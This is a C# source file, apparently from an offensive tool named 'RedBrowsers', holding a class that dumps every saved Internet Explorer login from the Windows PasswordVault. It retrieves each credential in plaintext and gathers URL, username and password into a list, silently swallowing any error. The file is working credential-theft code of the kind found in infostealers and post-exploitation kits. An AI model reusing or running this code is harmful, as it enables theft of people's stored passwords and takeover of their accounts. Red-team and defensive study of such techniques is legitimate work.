using Windows.Security.Credentials;
using System.Linq;
using RedBrowsers.Utlis;
using System.Collections.Generic;
using System;

namespace RedBrowsers.InternetExplorer
{
    class IEStorage
    {
        public static List<ExtractedCredentials> ReadPasswords() 
        {
            List<ExtractedCredentials> logins = new List<ExtractedCredentials>();

            try
            {
                PasswordVault vault = new PasswordVault();
                IReadOnlyList<PasswordCredential> credentials = vault.RetrieveAll();
                for (var i = 0; i < credentials.Count; i++)
                {
                    PasswordCredential cred = credentials.ElementAt(i);
                    cred.RetrievePassword();
                    logins.Add(new ExtractedCredentials
                    {
                        URL = cred.Resource,
                        UserName = cred.UserName,
                        Password = cred.Password,
                        Application = "Internet Explorer"

                    });

                }

            }
            catch (Exception ex) 
            {
            }
            return logins;
        }
    }
}
